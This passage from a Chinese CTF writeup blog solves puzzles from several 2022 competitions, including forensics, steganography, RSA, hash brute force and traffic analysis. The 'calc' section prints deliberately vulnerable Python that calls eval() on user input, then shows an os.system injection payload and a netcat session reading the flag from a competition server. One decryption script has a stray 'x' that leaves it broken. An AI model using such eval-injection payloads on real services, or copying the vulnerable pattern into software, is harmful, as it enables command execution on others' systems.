plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者利用什么文件进行进一步提权？请提交提权过程中入口payload文件的文件名的md5值（完整文件名包含后缀）</span><br></pre></td></tr></table></figure><p>由上两题已知，恶意用户为ming，并进行了远程桌面链接，打开pml，筛选ming用户的文件，</p><p>尝试了几个文档，发现downloads有一个helper.doc是正确的，</p><p>e0e2da2e60f461127fa574eedc550acf</p><h3 id="BlueTeam-4"><a href="#BlueTeam-4" class="headerlink" title="BlueTeam.4"></a>BlueTeam.4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者最终完成提权后的进程名字是什么？请提交进程名的md5值（完整进程名包含后缀）</span><br></pre></td></tr></table></figure><p>根据上一题思路，word的主程序调用了一个yoWtVVigSCtVR.exe</p><p>dc68a3d4e1912e85f5341d6702b07378</p><h3 id="BlueTeam-5"><a href="#BlueTeam-5" class="headerlink" title="BlueTeam.5"></a>BlueTeam.5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根据《数据分类分级》，从日志中能够知道被窃取的最重要的文件是什么？请提交文件名的md5值（完整文件名（包含后缀））</span><br></pre></td></tr></table></figure><p>查看数据分级分类，了解相关的级别，</p><p>打开PML文件，查看的时候发现有很多表格，其中最终要的是个人信息文件</p><p>141d63acec935f304fbd06ad3d09a547</p>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年9月比赛writeups</title>
      <link href="/article/2022-10-01-2022%E5%B9%B49%E6%9C%88%E6%AF%94%E8%B5%9Bwriteups/"/>
      <url>/article/2022-10-01-2022%E5%B9%B49%E6%9C%88%E6%AF%94%E8%B5%9Bwriteups/</url>
      
        <content type="html"><![CDATA[<h1 id="2022年9月比赛writeups"><a href="#2022年9月比赛writeups" class="headerlink" title="2022年9月比赛writeups"></a>2022年9月比赛writeups</h1><h2 id="2022年第三届电信和互联网行业职业技能竞赛"><a href="#2022年第三届电信和互联网行业职业技能竞赛" class="headerlink" title="2022年第三届电信和互联网行业职业技能竞赛"></a>2022年第三届电信和互联网行业职业技能竞赛</h2><p><a href="/image/media/2022/ctf/2022.09/9%E6%9C%88%E6%AF%94%E8%B5%9B%E9%99%84%E4%BB%B6/2022%E5%B9%B4%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B.zip">2022年第三届电信和互联网行业职业技能竞赛</a></p><h3 id="Broken-Radio"><a href="#Broken-Radio" class="headerlink" title="Broken Radio"></a>Broken Radio</h3><p>没出，蹲不到wp</p><h3 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h3><p>题目附件代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">key=&quot;[HIDDEN]&quot;</span><br><span class="line"></span><br><span class="line">def calc():</span><br><span class="line">    line = input(&quot; &gt;&gt;&gt; &quot;)</span><br><span class="line">    if(len(line)&gt;9):</span><br><span class="line">        return print(&quot;500 Internal Server Error\n&quot;)</span><br><span class="line">    try:</span><br><span class="line">        print(eval(line))</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def supper_calc():</span><br><span class="line">    print(&quot;Please enter the invitation code&quot;)</span><br><span class="line">    code = input(&quot; &gt;&gt;&gt; &quot;)</span><br><span class="line">    if(code == key):</span><br><span class="line">        line = input(&quot; &gt;&gt;&gt; &quot;)</span><br><span class="line">        try:</span><br><span class="line">            print(eval(line))</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;403 Forbidden\n&quot;)</span><br><span class="line">        </span><br><span class="line">while(1):</span><br><span class="line">    print(&quot;What do you want?&quot;)</span><br><span class="line">    print(&#x27;1.clac&#x27;)</span><br><span class="line">    print(&#x27;2.supper clac&#x27;)</span><br><span class="line">    choice = input(&quot;Please input your option &gt;&gt;&gt; &quot;)</span><br><span class="line">    if(choice == &quot;1&quot;):</span><br><span class="line">        calc()</span><br><span class="line">        input(&quot;press any key to continue...&quot;)</span><br><span class="line">    elif(choice == &quot;2&quot;):</span><br><span class="line">        supper_calc()</span><br><span class="line">        input(&quot;press any key to continue...&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;404 NOT FOUND\n&quot;)</span><br><span class="line">        input(&quot;press any key to continue...&quot;)</span><br></pre></td></tr></table></figure><p>审计代码之后发现有两个选项第一个是calc，然后需要在clac中拿到key，并在supper clac中使用这个key，然后需要注意的是会第一个calc的长度有限制，于是print(eval(line))中使用ssti的payload即可任意命令执行。</p><p>可以使用SSTI的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;cat /f*&#x27;)</span><br></pre></td></tr></table></figure><p>攻击复现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc 1.14.97.218 29423                       </span><br><span class="line">What do you want?</span><br><span class="line">1.clac</span><br><span class="line">2.supper clac</span><br><span class="line">Please input your option &gt;&gt;&gt;1</span><br><span class="line"> &gt;&gt;&gt;key</span><br><span class="line">0317dcd25f8916b43998be722434ed14</span><br><span class="line">press any key to continue...</span><br><span class="line"></span><br><span class="line">What do you want?</span><br><span class="line">1.clac</span><br><span class="line">2.supper clac</span><br><span class="line">Please input your option &gt;&gt;&gt;2</span><br><span class="line">Please enter the invitation code</span><br><span class="line"> &gt;&gt;&gt;0317dcd25f8916b43998be722434ed14</span><br><span class="line"> &gt;&gt;&gt;__builtins__.__dict__[&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;cat /f*&#x27;)</span><br><span class="line">flag&#123;47031505122527365331894107816314&#125;</span><br><span class="line">0</span><br><span class="line">press any key to continue...</span><br></pre></td></tr></table></figure><h3 id="eye"><a href="#eye" class="headerlink" title="eye"></a>eye</h3><p>下载附件可以拿到一个图片，binwalk+foremost得到一个压缩包</p><p><img src="/image/media/2022/ctf/2022.09/img/5.png"></p><p>可以看到zip里面的文件大小是一样的，所以猜测需要使用后面的crc来爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">工具地址：https://github.com/theonlypwner/crc32</span><br></pre></td></tr></table></figure><p>爆破结果（去掉多余的信息）（0x0f84c81e、0x532694fd、0xf2007D19）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python2 crc32.py reverse 0x0f84c81e</span><br><span class="line">6 bytes: ohhhh_ (OK)</span><br><span class="line">                      </span><br><span class="line">python2 crc32.py reverse 0x532694fd</span><br><span class="line">6 bytes: you_fo (OK)</span><br><span class="line"></span><br><span class="line">python2 crc32.py reverse 0xf2007D19</span><br><span class="line">6 bytes: und_me (OK)</span><br></pre></td></tr></table></figure><p>所以得到zip的密码：ohhhh_you_found_me。解压得到密文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YzMxZDFmMjNlY2VjNjRhYzI4Y2MxMDM2MDY2ZmEx</span><br></pre></td></tr></table></figure><p>base64解密之后得到密文：c31d1f23ecec64ac28cc1036066fa1</p><p>根据题目名称可以猜测是不是需要使用silenteye</p><p><img src="/image/media/2022/ctf/2022.09/img/6.png"></p><p>解密得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b9bb5b2db051d713e307b2b8b98050ae&#125;</span><br></pre></td></tr></table></figure><h3 id="降龙十八掌"><a href="#降龙十八掌" class="headerlink" title="降龙十八掌"></a>降龙十八掌</h3><p><a href="/image/media/2022/ctf/2022.09/9%E6%9C%88%E6%AF%94%E8%B5%9B%E9%99%84%E4%BB%B6/%E9%99%8D%E9%BE%99%E5%8D%81%E5%85%AB%E6%8E%8C.zip">降龙十八掌</a></p><p>题目附件给了一个apng的图片，可以用浏览器打开看到有动态效果，可以看到有很多不一样的，使用apngdis_gui提取出来，共557张</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apngdis_gui下载地址：http://www.downcc.com/soft/40902.html</span><br></pre></td></tr></table></figure><p>查看每一张图片，发现有的图片在圆的圆点部分有一个黑点，RGB值为6，7，8，可以猜测使用这个点组成了什么东西</p><p>接下来我们只需要提取这个不一样的像素点就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import  os</span><br><span class="line">from PIL import Image</span><br><span class="line">flag_img = Image.new(&#x27;1&#x27;, (350,400))</span><br><span class="line">path=r&quot;./apng&quot;</span><br><span class="line">for root, dirs, files in os.walk(path):</span><br><span class="line">    for name in files:</span><br><span class="line">        png_path=os.path.join(root, name)</span><br><span class="line">        image = Image.open(png_path)</span><br><span class="line">        image = image.convert(&quot;RGB&quot;)</span><br><span class="line">        width, height = image.size</span><br><span class="line">        for w in range(width):</span><br><span class="line">            for h in range(height):</span><br><span class="line">                if image.getpixel((w, h)) == (6, 7, 8):</span><br><span class="line">                    flag_img.putpixel((h, w), 1)</span><br><span class="line">    flag_img.save(&quot;1.png&quot;)</span><br><span class="line">    flag_img.show()</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/ctf/2022.09/img/apng.png"></p><p>反色加标志位</p><p><img src="/image/media/2022/ctf/2022.09/img/7.png"></p><p>扫码即可得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;18_palmattacks_to_defeat_dragons&#125;</span><br></pre></td></tr></table></figure><h2 id="2022望岳杯"><a href="#2022望岳杯" class="headerlink" title="2022望岳杯"></a>2022望岳杯</h2><p><a href="/image/media/2022/ctf/2022.09/9%E6%9C%88%E6%AF%94%E8%B5%9B%E9%99%84%E4%BB%B6/2022%E6%9C%9B%E5%B2%B3%E6%9D%AF.zip">2022望岳杯misc附件下载地址</a></p><h3 id="001MMS-协议"><a href="#001MMS-协议" class="headerlink" title="001MMS 协议"></a>001MMS 协议</h3><p>MMS流量分析，右键追踪tcp流时发现mms流量中有几个不正常的流量</p><p><img src="/image/media/2022/ctf/2022.09/img/1.png"></p><p>拼接得到@iH&lt;,{)G7O07k7)ScP!3F}A</p><p>然后base91解密得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3QSZjGU5qey6&#125;</span><br></pre></td></tr></table></figure><h3 id="003攻击行为还原"><a href="#003攻击行为还原" class="headerlink" title="003攻击行为还原"></a>003攻击行为还原</h3><p>在crontab文件中发现注释：TVZQVU0zM1NNTlNYMj09PQ==使用base64、base32解密之后得到flag的后半段</p><p>e_Force}</p><p>然后找到密码的各种参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#linux\root\.ssh\id_rsa文件中找到</span><br><span class="line">n=1606938044309278499168642398192229212629290234347717645487123</span><br><span class="line">e=65537</span><br><span class="line">#FlaG.txt文件中找到</span><br><span class="line">c=1566077545968868311749088444723100549024925747577903610033503</span><br></pre></td></tr></table></figure><p>然后根据算法得到flag前半部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line">n=1606938044309278499168642398192229212629290234347717645487123</span><br><span class="line">e=65537</span><br><span class="line">c=1566077545968868311749088444723100549024925747577903610033503</span><br><span class="line"></span><br><span class="line">phi = (1267650600235241044365044382487-1)*(1267650600260888172240281085029-1)</span><br><span class="line">d = invert(e,phi)</span><br><span class="line">print(bytes.fromhex(hex(pow(c,d,n))[2:]))</span><br><span class="line"># flag&#123;SSH_Brut</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;SSH_Brute_Force&#125;</span><br></pre></td></tr></table></figure><h3 id="004留痕取证"><a href="#004留痕取证" class="headerlink" title="004留痕取证"></a>004留痕取证</h3><p>直接在流量中搜索flag，定位到tcp.stream eq 16</p><p><img src="/image/media/2022/ctf/2022.09/img/3.png"></p><p>得到flag后面一段字符：ugana}</p><p>在tcp流15中发现了特殊字符</p><p><img src="/image/media/2022/ctf/2022.09/img/2.png"></p><p>1d918f7de272synt{ohshwv但是根据习惯可以知道synt{ohshwv是rot13加密得到flag前面半段flag{bufuji</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bufujiugana&#125;</span><br></pre></td></tr></table></figure><h3 id="005漏洞挖掘"><a href="#005漏洞挖掘" class="headerlink" title="005漏洞挖掘"></a>005漏洞挖掘</h3><p>给的是一个二进制文件，没法直接run需要密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./d5000_login                                                          </span><br><span class="line">**************************D5000 Authentication Module******************************</span><br><span class="line">usage:./d5000_login password</span><br></pre></td></tr></table></figure><p>使用IDA分析看到字符串中有特殊字符串用作是密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6f73684294324280a40c053404133bec</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./d5000_login 6f73684294324280a40c053404133bec        </span><br><span class="line">**************************D5000 Authentication Module******************************</span><br><span class="line">欢迎访问D5000认证模块，正在验证您的密码信息，请稍后...</span><br><span class="line">you have login success!</span><br><span class="line">54656661e280827366617b35302a6f692a6173692a4c6840383268e280826c6769e280826c676430306c676e70732a7344426830317d</span><br></pre></td></tr></table></figure><p>得到的字符串使用hex然后栅栏之后得到</p><p><img src="/image/media/2022/ctf/2022.09/img/4.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The flag is flag&#123;d5000*login*pass*is*DLBhh@0812&#125;</span><br></pre></td></tr></table></figure><h3 id="006密文破解"><a href="#006密文破解" class="headerlink" title="006密文破解"></a>006密文破解</h3><p>已有密文的md5：b9fd??9d5??c1?f6c??abd????5ac??7</p><p>已有部分数据：?1_1001_10_600_600_??00??7_202103301539</p><p>看起来就是爆破五位字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">data = &quot;&#123;&#125;1_1001_10_600_600_&#123;&#125;&#123;&#125;00&#123;&#125;&#123;&#125;7_202103301539&quot;</span><br><span class="line">md5_data = &quot;b9fd??9d5??c1?f6c??abd????5ac??7&quot;</span><br><span class="line">t=&quot;&quot;</span><br><span class="line">for i in range(32,129):#所有可见字符</span><br><span class="line">    t += chr(i)</span><br><span class="line">for i1 in t:</span><br><span class="line">    for i2 in t:</span><br><span class="line">        for i3 in t:</span><br><span class="line">            for i4 in t:</span><br><span class="line">                for i5 in t:</span><br><span class="line">                    tmp = data.format(i1,i2,i3,i4,i5)</span><br><span class="line">                    tmd5 = hashlib.md5(tmp.encode()).hexdigest()</span><br><span class="line">                    if tmd5[:4] == &quot;b9fd&quot; and tmd5[6:9] == &quot;9d5&quot; and tmd5[-1] == &quot;7&quot;:</span><br><span class="line">                        print(tmp)</span><br><span class="line"> </span><br><span class="line"># 1_1001_10_600_600_1500.87_202103301539</span><br></pre></td></tr></table></figure><h2 id="2022羊城杯"><a href="#2022羊城杯" class="headerlink" title="2022羊城杯"></a>2022羊城杯</h2><p><a href="/image/media/2022/ctf/2022.09/9%E6%9C%88%E6%AF%94%E8%B5%9B%E9%99%84%E4%BB%B6/%E7%BE%8A%E5%9F%8E%E6%9D%AF.zip">2022羊城杯misc附件下载地址</a></p><h3 id="where-is-secret"><a href="#where-is-secret" class="headerlink" title="where_is_secret"></a>where_is_secret</h3><p>文件名vivo50和vig可以知道下面的内容需要维吉尼亚解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Naseu bybkjkl, O wt mna Wkkopwkja hl Qrkgeux Fasxtorr. Zdl Kaozbgj hksu oty fblz hhntyoxj wu tzphvq ku Nqnhbta, hgj pox Qupo geyiuna ago ixkj jhtpyhrhlw hu aak Nblyehg gntr. Nahkj pvwgu pl QBJ Vxwgr Zdbkyzhr, O jlxj ovfkkux zk ikojn fk 29.94 bpgmay-layrbtc vkocpggh jaoyrxt wz kgpphto uhc. Soxt E yxvas mna Ynyoptt wyfe, E dbrh pgbeax ekb mu yvfk pv Nqnhbta ah ha aak rpvk lyxyekxtp.aak lhlysvkj ez ZCDA@K1tz0frjo</span><br></pre></td></tr></table></figure><p>使用<a href="https://www.guballa.de/vigenere-solver%E5%BE%97%E5%88%B0%E5%AF%86%E9%92%A5gwht%E5%92%8C%E4%B8%8B%E9%9D%A2%E7%9A%84%E5%AF%86%E7%A0%81">https://www.guballa.de/vigenere-solver得到密钥gwht和下面的密码</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello friends, I am the President of Ukraine Zelensky. The Russian army has just launched an attack on Ukraine, and the Kyiv airport has been controlled by the Russian army. Heard today is KFC Crazy Thursday, I need someone to bring me 29.94 finger-sucking original chicken as rations now. When I repel the Russian army, I will invite you to come to Ukraine to be the vice president.the password is GWHT@R1nd0yyds</span><br></pre></td></tr></table></figure><p>然后得到zip的密码GWHT@R1nd0yyds然后解压得到bmp文件同时根据提示得到一个加密脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import math</span><br><span class="line">def encode(text):</span><br><span class="line">    str_len = len(text)</span><br><span class="line">    width = math.ceil(str_len ** 0.5)</span><br><span class="line">    im = Image.new(&quot;RGB&quot;, (width, width), 0x0)</span><br><span class="line">    x, y = 0, 0</span><br><span class="line">    for i in text:</span><br><span class="line">        index = ord(i)</span><br><span class="line">        rgb = (0, (index &amp; 0xFF00) &gt;&gt; 8, index &amp; 0xFF)</span><br><span class="line">        im.putpixel((x, y), rgb)</span><br><span class="line">        if x == width - 1:</span><br><span class="line">            x = 0</span><br><span class="line">            y += 1</span><br><span class="line">        else:</span><br><span class="line">            x += 1</span><br><span class="line">    return im</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    with open(&quot;829962.txt&quot;, encoding=&quot;gbk&quot;) as f:</span><br><span class="line">        all_text = f.read()</span><br><span class="line">        im = encode(all_text)</span><br><span class="line">        im.save(&quot;out.bmp&quot;)</span><br></pre></td></tr></table></figure><p>根据上面的加密脚本得到解密脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">import math</span><br><span class="line"># if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">#     #(0, 101, 176)</span><br><span class="line">#     print((101&lt;&lt;8)+175)</span><br><span class="line">#     print(chr((101&lt;&lt;8)+175))</span><br><span class="line"># print(118&lt;&lt;8+244)</span><br><span class="line"># (0, 89, 22)</span><br><span class="line">#     for i in range(999999):</span><br><span class="line">#         if 371==math.ceil(i ** 0.5):</span><br><span class="line">#             print(i)# 136901-137641</span><br><span class="line"># 0x2233</span><br><span class="line"># 0x22</span><br><span class="line"># 0x33</span><br><span class="line"># 118&lt;&lt;8+244</span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">img = Image.open(&#x27;out.bmp&#x27;)  # 371*371</span><br><span class="line">height = img.size[0]</span><br><span class="line"># print(img.size)</span><br><span class="line">width = img.size[1]</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for x in range(height):</span><br><span class="line">    for y in range(width):</span><br><span class="line">        pixel = img.getpixel((y,x))</span><br><span class="line">        # print(pixel)</span><br><span class="line">        # print(pixel[0],pixel[1],pixel[2])</span><br><span class="line">        # print(chr((pixel[1] &lt;&lt; 8) + pixel[2]))</span><br><span class="line">        flag += chr((pixel[1] &lt;&lt; 8) + pixel[2])</span><br><span class="line">new=&quot; &quot;+flag+&quot; &quot;</span><br><span class="line">new=new.replace(&quot; &quot;,&quot;&quot;)</span><br><span class="line">new=new.replace(&quot;,&quot;,&quot;&quot;)</span><br><span class="line">new=new.replace(&quot;\n&quot;,&quot;&quot;)</span><br><span class="line">new=new.replace(&quot;(&quot;,&quot;&quot;)</span><br><span class="line">new=new.replace(&quot;)&quot;,&quot;&quot;)</span><br><span class="line">new=new.replace(&quot;。&quot;,&quot;&quot;)</span><br><span class="line">new=new.replace(&quot;，&quot;,&quot;&quot;)</span><br><span class="line">new=new.replace(&quot;?&quot;,&quot;&quot;)</span><br><span class="line">new=new.replace(&quot;　　&quot;,&quot;&quot;)</span><br><span class="line">t=&quot;&quot;</span><br><span class="line">print(new)</span><br><span class="line">for i in range(len(new)):</span><br><span class="line">    if &quot;_&quot; == new[i]:</span><br><span class="line">        t+=new[i]+new[i+1]</span><br><span class="line">        print(new[i]+new[i+1])</span><br><span class="line">    if 32 &lt; ord(new[i]) &lt; 128:</span><br><span class="line">        if ord(new[i-1]) &gt; 129:</span><br><span class="line">           x if ord(new[i+1]) &gt; 129 :</span><br><span class="line">                t += new[i]</span><br><span class="line">                print(new[i-3:i+3],&quot;\t&quot;,new[i])</span><br><span class="line">            else:</span><br><span class="line">                pass</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br><span class="line">    else:</span><br><span class="line">        pass</span><br><span class="line">print(t)</span><br><span class="line">with open(&quot;829962.txt&quot;,&quot;w+&quot;, encoding=&quot;gbk&quot;) as f:</span><br><span class="line">    all_text = f.write(t)</span><br></pre></td></tr></table></figure><p>根据输出结果可以看到flag，然后过滤掉一些关键字符得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">与超越f阿德          f</span><br><span class="line">的意义l——          l</span><br><span class="line">比重快6岁的          6</span><br><span class="line">生来就a身体          a</span><br><span class="line">更好的g动机          g</span><br><span class="line">存在生&#123;理过          &#123;</span><br><span class="line">为重要h的方          h</span><br><span class="line">这孩子7岁时          7</span><br><span class="line">隐瞒了3年最          3</span><br><span class="line">像有某1种东          1</span><br><span class="line">的几步d心理          d</span><br><span class="line">表现由3于自          3</span><br><span class="line">_1</span><br><span class="line">我想是8年—          8</span><br><span class="line">说：“4岁时          4</span><br><span class="line">过夜她2岁时          2</span><br><span class="line">失踪了8天找          8</span><br><span class="line">里关了8天没          8</span><br><span class="line">一耳光n看到          n</span><br><span class="line">儿呆了8天因          8</span><br><span class="line">_t</span><br><span class="line">当时我3岁”          3</span><br><span class="line">让一个3岁小          3</span><br><span class="line">：“我3岁时          3</span><br><span class="line">比我大3岁的          3</span><br><span class="line">是家里5个孩          5</span><br><span class="line">著在我4岁左          4</span><br><span class="line">“记得4岁时          4</span><br><span class="line">嚅嚅低h语这          h</span><br><span class="line">话了有8周完          8</span><br><span class="line">事：“5岁时          5</span><br><span class="line">板整整5分钟          5</span><br><span class="line">的工作8年前          8</span><br><span class="line">上干了8年他          8</span><br><span class="line">孩子合3作的          3</span><br><span class="line">_p</span><br><span class="line">不会再1像那          1</span><br><span class="line">院呆了4年医          